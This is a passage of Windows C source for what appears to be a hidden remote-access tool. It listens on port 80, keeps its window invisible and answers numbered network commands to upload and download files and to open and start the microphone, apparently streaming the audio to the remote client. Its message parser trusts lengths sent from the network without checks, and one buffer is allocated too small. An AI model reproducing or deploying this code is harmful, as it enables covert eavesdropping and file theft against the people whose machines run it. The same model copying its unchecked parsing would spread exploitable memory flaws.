			unsigned long size = GetFileSize(Clients[ci].hFile, NULL);
			char buf[256];
			wsprintf(buf, "%d", GetFileSize(Clients[ci].hFile, NULL));

			temp = data[0];

			char *buffer;
			buffer = (char *)calloc(lstrlen(temp), sizeof(char));

			for (int i=lstrlen(temp); i>0; i--)
				if (temp[i] == '\\')
					break;
			for (int j=i+1; j<lstrlen(temp); j++)
				strncat(buffer, &temp[j], 1);

			argv[0] = buffer;
			argl[0] = (int)strlen(buffer) + 1;
			argv[1] = buf;
			argl[1] = (int)strlen(buf) + 1;

			SendData(129, 2, argv, argl, ci);
			Clients[ci].Transferring = true;
			WSAAsyncSelect(Clients[ci].hSocket, ghWnd, WM_MAINSOCKET, 0);
			ioctlsocket(Clients[ci].hSocket, FIONBIO, 0);
			Sleep(100);
			StartSendThread(Clients[ci].hSocket, ci);
		}
		break;

	case 129:
		if (datac > 1) {
			HANDLE hFile;
			DWORD dw;
			FILETRANSFERARGS *pArgs;
			pArgs = (FILETRANSFERARGS *)malloc(sizeof(FILETRANSFERARGS));

			int filesize;
			filesize = atoi(data[1]);

			hFile = CreateFile(data[0], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			//			Sleep(1000);
			if (hFile != INVALID_HANDLE_VALUE) {
				Clients[ci].Transferring = true;
				pArgs->hFile = hFile;
				pArgs->hSocket = Clients[ci].hSocket;
				pArgs->FileSize = filesize;
				WSAAsyncSelect(Clients[ci].hSocket, ghWnd, WM_MAINSOCKET, 0);
				ioctlsocket(Clients[ci].hSocket, FIONBIO, 0);
				CreateThread(NULL, 0, ReceiveFileThread, pArgs, 0, &dw);
			}
			//fixme: else?
		}
		break;

	case 301:
		int i, numdevs, slen;
		WAVEINCAPS caps;

		for (i=0; i<waveInGetNumDevs(); i++)
		{
			waveInGetDevCaps(i, &caps, sizeof(WAVEINCAPS));

			char buf[256];
			wsprintf(buf, "%i:%s", i, caps.szPname);
			Text = (char *)&buf;
			dw = lstrlen(Text);
			SendData(301, 1, &Text, &dw, ci);
		}

		break;
	case 302:
		int p_error;
		p_error = 0;
		waveInClose(g_wave_in);
		g_wave_format.wFormatTag = WAVE_FORMAT_PCM;
		g_wave_format.nChannels = 1;
		g_wave_format.nSamplesPerSec = 8000; // 8000 22050 44100
		g_wave_format.nAvgBytesPerSec = 8000; // 8000 22050 44100
		g_wave_format.wBitsPerSample = 8;
		g_wave_format.nBlockAlign = 1; 
		g_ci = ci;
		p_error = waveInOpen(&g_wave_in, 0, &g_wave_format, (DWORD_PTR) wave_in_proc, 0, CALLBACK_FUNCTION);
		g_state_in = STATE_STOPPED;
		//		break;
	case 303:
		int error;
		error = 0;

		g_state_in = STATE_PLAYING;

		for (i=0; i<4; i++)
		{
			g_header_in[i].lpData = g_buffer_in + i*4096;
			g_header_in[i].dwBufferLength = 4096;
			g_header_in[i].dwFlags = 0;

			if (error = waveInPrepareHeader(g_wave_in, &g_header_in[i], sizeof(WAVEHDR)))break;
			if (error = waveInAddBuffer(g_wave_in, &g_header_in[i], sizeof(WAVEHDR)))break;
		}
		if (!error) error = waveInStart(g_wave_in);
		break;
	case 304:
		g_state_in = STATE_STOPPED;
		SendString("304", "304", ci);
		break;
	default:
		// Invalid command
		SendStr("Invalid command.", ci);
		break;
	}
}


void ProcessQueue(unsigned short ci)
{
	char *SckData, **data;
	unsigned long Len, Index, datac, i;
	unsigned long *datal;
	unsigned short cmd;

	if (!Processing && Clients[ci].RecvBufSize >= 4) {
		Processing = true;

		// Extract 4 byte message length
		memcpy(&Len, Clients[ci].RecvBuffer, 4);

		if (Clients[ci].RecvBufSize >= Len + 4) {

			// Extract 2 byte command
			memcpy(&cmd, Clients[ci].RecvBuffer + 4, 2);

			// Extract 4 byte argument count
			memcpy(&datac, Clients[ci].RecvBuffer + 6, 4);

			// Allocate buffers for data
			data = (char **)malloc(datac * sizeof(char *));
			datal = (unsigned long *)malloc(datac * sizeof(unsigned long));
			Len -= 6;
			SckData = (char *)malloc(Len);

			// Copy data from receive buffer
			memcpy(SckData, Clients[ci].RecvBuffer + 10, Len);

			// Shift receive buffer to the left			
			Clients[ci].RecvBufSize -= Len + 10;
			memcpy(Clients[ci].RecvBuffer, Clients[ci].RecvBuffer + Len + 10, Clients[ci].RecvBufSize);
			//memmove(RecvBuffer, RecvBuffer + Len + 10, RecvBufSize);
			//RecvBuffer = (char *)realloc(RecvBuffer, RecvBufSize);

			// Extract arguments
			Index = 0;
			for (i = 0; i < datac; i++) {
				memcpy(&Len, SckData + Index, 4);
				Index += 4;
				datal[i] = Len;
				data[i] = (char *)malloc(Len + 1);
				memcpy(data[i], SckData + Index, Len);
				data[i][Len] = '\0'; // Insert extra null for easy string manipulation
				Index += Len;
			}
			free(SckData);
			Processing = false;

			// Parse data
			ParseData(cmd, datac, data, datal, ci);

			// Free memory
			for (i = 0; i < datac; i++)
				free(data[i]);
			free(data);
			free(datal);

			ProcessQueue(ci);
		}
		Processing = false;
	}
}

// Message handler for the app
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	HDC           hdc;
	PAINTSTRUCT   ps;
	//RECT          rect;
	int wmId, wmEvent;

	switch (message) 
	{
	case SWM_TRAYMSG:
		switch(lParam)
		{
		case WM_LBUTTONDBLCLK:
			ShowWindow(hWnd, SW_RESTORE);
			break;
		case WM_RBUTTONDOWN:
		case WM_CONTEXTMENU:
			ShowContextMenu(hWnd);
		}
		break;
	case WM_SYSCOMMAND:
		if((wParam & 0xFFF0) == SC_MINIMIZE)
		{
			ShowWindow(hWnd, SW_HIDE);
			return 1;
		}
		else if(wParam == IDM_ABOUT)
			DialogBox(hInst, (LPCTSTR)IDD_ABOUTBOX, hWnd, (DLGPROC)About);
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam); 

		switch (wmId)
		{
		case SWM_SHOW:
			ShowWindow(hWnd, SW_RESTORE);
			break;
		case SWM_HIDE:
		case IDOK:
			ShowWindow(hWnd, SW_HIDE);
			break;
		case SWM_EXIT:
			DestroyWindow(hWnd);
			break;
		case IDM_ABOUT:
			DialogBox(hInst, (LPCTSTR)IDD_ABOUTBOX, hWnd, (DLGPROC)About);
			break;
		}
		return 1;
	case WM_INITDIALOG:
		return OnInitDialog(hWnd);
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		niData.uFlags = 0;
		Shell_NotifyIcon(NIM_DELETE,&niData);
		PostQuitMessage(0);
		break;

	case WM_MAINSOCKET:
		{
			switch (lParam & 0xFFFF)
			{
			case FD_ACCEPT:
				{
					if (wParam == ghTcpSocket)
					{
						TCPAccept(wParam);

						// state which structure members are valid
						niData.uFlags = NIF_TIP;

						// tooltip message
						wsprintf(niData.szTip, "ClientCount %i", ClientCount);
						Shell_NotifyIcon(NIM_MODIFY,&niData);
					}
					break;
				}
			case FD_CLOSE:
				{
					TCPCleanup(wParam);

					// state which structure members are valid
					niData.uFlags = NIF_TIP;

					// tooltip message
					wsprintf(niData.szTip, "ClientCount %i", ClientCount);
					Shell_NotifyIcon(NIM_MODIFY,&niData);
				}
			case FD_READ:
				{
					for (int i=0; i<ClientCount; i++)
						if (Clients[i].hSocket == wParam)
						{
							memset(Clients[i].SocketBuffer, 0, sizeof(Clients[i].SocketBuffer));
							int len = recv(wParam, Clients[i].SocketBuffer, sizeof(Clients[i].SocketBuffer), 0);
							if (len > 0)
							{
								Clients[i].RecvBufSize += len;
								Clients[i].RecvBuffer = (char *)realloc(Clients[i].RecvBuffer, Clients[i].RecvBufSize);
								memcpy(Clients[i].RecvBuffer + Clients[i].RecvBufSize - len, Clients[i].SocketBuffer, len);
								ProcessQueue(i);
								//								SetRichText(CON_NORMAL, "Main (%i): %s\r\n", i, Clients[i].SocketBuffer);
								// state which structure members are valid
								niData.uFlags = NIF_TIP;

								// tooltip message
								wsprintf(niData.szTip, "Main (%i): %s", i, Clients[i].SocketBuffer);
								Shell_NotifyIcon(NIM_MODIFY,&niData);
							}
							break;
						}

				}
			case FD_WRITE:
				{
					int Len;

					for (int i=0; i<ClientCount; i++)
						if (Clients[i].hSocket == wParam)
						{
							if (Clients[i].SendBufSize > 0) {
								Len = send(wParam, Clients[i].SendBuffer, Clients[i].SendBufSize, 0);
								if (Len > 0) {
									Clients[i].SendBufSize -= Len;
									memcpy(Clients[i].SendBuffer, Clients[i].SendBuffer + Len, Clients[i].SendBufSize);
									//memmove(SendBuffer, SendBuffer + Len, SendBufSize);
									//SendBuffer = (char *)realloc(SendBuffer, SendBufSize);
								}
							}
							break;
						}
						break;

				}
			}
			return 0;
		}
	case WM_KEYDOWN:
		switch(wParam)
		{
		case VK_ESCAPE:
			PostQuitMessage(0);
			return 0;
		}
		break;
	case WM_ERASEBKGND:
		return 1;
		break;
	case WM_MOVE:
		//call for a paint
		InvalidateRect(hWnd, NULL, FALSE);
		UpdateWindow(hWnd);
		break;
	case WM_PAINT:
		{
			hdc = BeginPaint(hWnd, &ps);
			//			CaptureAnImage(hWnd);
			EndPaint(hWnd, &ps);
			break;
		}
	case WM_SIZE:
		break;
	case WM_GETMINMAXINFO:
		{
			//Set window size constraints
			((MINMAXINFO *)lParam)->ptMinTrackSize.x = 500;
			((MINMAXINFO *)lParam)->ptMinTrackSize.y = 300;
			break;
		}
	}
	return DefWindowProc(hWnd, message, wParam, lParam);
}

// Message handler for about box.
LRESULT CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_INITDIALOG:
		return TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
		{
			EndDialog(hDlg, LOWORD(wParam));
			return TRUE;
		}
		break;
	}
	return FALSE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MSG msg;
	HACCEL hAccelTable;

	LoadDynamic();

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow)) return FALSE;
//	hAccelTable = LoadAccelerators(hInstance, (LPCTSTR)IDC_STEALTHDIALOG);

	ghInstance = GetModuleHandle(0);
	TCPListen(80);

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0))
	{
//		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)||
//			!IsDialogMessage(msg.hwnd,&msg) ) 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	return (int) msg.wParam;
}

//	Initialize the window and tray icon
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	// prepare for XP style controls
	InitCommonControls();

	// store instance handle and create dialog
	hInst = hInstance;
//	ghWnd = CreateDialog( hInstance, MAKEINTRESOURCE(IDD_DLG_DIALOG),
//		NULL, (DLGPROC)DlgProc );
//	if (!ghWnd) return FALSE;

	static char szClassName[] = "Console";
	static char szWindowName[] = "Console";

	// Define & register window class
	WNDCLASSEX WndClass;
	MSG msg;

	memset(&WndClass, 0, sizeof(WndClass));
	WndClass.cbSize = sizeof(WndClass);						// size of structure
	WndClass.lpszClassName = szClassName;					// name of window class
	WndClass.lpfnWndProc = WndProc;							// points to a window procedure
	WndClass.hInstance = ghInstance;						// handle to instance
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);		// predefined app. icon
	WndClass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);		// small class icon
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);			// predefined arrow
	WndClass.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);	// background brush
	WndClass.lpszMenuName = NULL;							// name of menu resource

	if (!RegisterClassEx(&WndClass))
	{
		return 0;
	}

	// Create actual window
	ghWnd = CreateWindowEx(WS_EX_WINDOWEDGE, szClassName, szWindowName, WS_OVERLAPPEDWINDOW, // | WS_VISIBLE,
		CW_USEDEFAULT, CW_USEDEFAULT, 500, 300, 0, 0, ghInstance, 0);

	if (!ghWnd)
	{
		return 0;
	}

//	ShowWindow(ghWnd, SW_SHOW);
	UpdateWindow(ghWnd);

	// Fill the NOTIFYICONDATA structure and call Shell_NotifyIcon

	// zero the structure - note:	Some Windows functions require this but
	//								I can't be bothered which ones do and
	//								which ones don't.
	ZeroMemory(&niData,sizeof(NOTIFYICONDATA));

	// get Shell32 version number and set the size of the structure
	//		note:	the MSDN documentation about this is a little
	//				dubious and I'm not at all sure if the method
	//				bellow is correct
	ULONGLONG ullVersion = GetDllVersion(_T("Shell32.dll"));
	if(ullVersion >= MAKEDLLVERULL(5, 0,0,0))
		niData.cbSize = sizeof(NOTIFYICONDATA);
	else niData.cbSize = NOTIFYICONDATA_V2_SIZE;

	// the ID number can be anything you choose
	niData.uID = TRAYICONID;

	// state which structure members are valid
	niData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;

	// load the icon
	niData.hIcon = (HICON)LoadImage(hInstance,MAKEINTRESOURCE(IDI_STEALTHDLG),
		IMAGE_ICON, GetSystemMetrics(SM_CXSMICON),GetSystemMetrics(SM_CYSMICON),
		LR_DEFAULTCOLOR);

	// the window to send messages to and the message to send
	//		note:	the message value should be in the
	//				range of WM_APP through 0xBFFF
	niData.hWnd = ghWnd;
	niData.uCallbackMessage = SWM_TRAYMSG;

	// tooltip message
	lstrcpyn(niData.szTip, _T("Time flies like an arrow but\n   fruit flies like a banana!"), sizeof(niData.szTip)/sizeof(TCHAR));

	Shell_NotifyIcon(NIM_ADD,&niData);

	// free icon handle
	if(niData.hIcon && DestroyIcon(niData.hIcon))
		niData.hIcon = NULL;

	// call ShowWindow here to make the dialog initially visible

	return TRUE;
}

BOOL OnInitDialog(HWND hWnd)
{
	HMENU hMenu = GetSystemMenu(hWnd,FALSE);
	if (hMenu)
	{
		AppendMenu(hMenu, MF_SEPARATOR, 0, NULL);
		AppendMenu(hMenu, MF_STRING, IDM_ABOUT, _T("About"));
	}
	HICON hIcon = (HICON)LoadImage(hInst,
		MAKEINTRESOURCE(IDI_STEALTHDLG),
		IMAGE_ICON, 0,0, LR_SHARED|LR_DEFAULTSIZE);
	SendMessage(hWnd,WM_SETICON,ICON_BIG,(LPARAM)hIcon);
	SendMessage(hWnd,WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	return TRUE;
}

// Name says it all
void ShowContextMenu(HWND hWnd)
{
	POINT pt;
	GetCursorPos(&pt);
	HMENU hMenu = CreatePopupMenu();
	if(hMenu)
	{
		if( IsWindowVisible(hWnd) )
			InsertMenu(hMenu, -1, MF_BYPOSITION, SWM_HIDE, _T("Hide"));
		else
			InsertMenu(hMenu, -1, MF_BYPOSITION, SWM_SHOW, _T("Show"));
		InsertMenu(hMenu, -1, MF_BYPOSITION, SWM_EXIT, _T("Exit"));

		// note:	must set window to the foreground or the
		//			menu won't disappear when it should
		SetForegroundWindow(hWnd);

		TrackPopupMenu(hMenu, TPM_BOTTOMALIGN,
			pt.x, pt.y, 0, hWnd, NULL );
		DestroyMenu(hMenu);
	}
}

// Get dll version number
ULONGLONG GetDllVersion(LPCTSTR lpszDllName)
{
	ULONGLONG ullVersion = 0;
	HINSTANCE hinstDll;
	hinstDll = LoadLibrary(lpszDllName);
	if(hinstDll)
	{
		DLLGETVERSIONPROC pDllGetVersion;
		pDllGetVersion = (DLLGETVERSIONPROC)GetProcAddress(hinstDll, "DllGetVersion");
		if(pDllGetVersion)
		{
			DLLVERSIONINFO dvi;
			HRESULT hr;
			ZeroMemory(&dvi, sizeof(dvi));
			dvi.cbSize = sizeof(dvi);
			hr = (*pDllGetVersion)(&dvi);
			if(SUCCEEDED(hr))
				ullVersion = MAKEDLLVERULL(dvi.dwMajorVersion, dvi.dwMinorVersion,0,0);
		}
		FreeLibrary(hinstDll);
	}
	return ullVersion;
}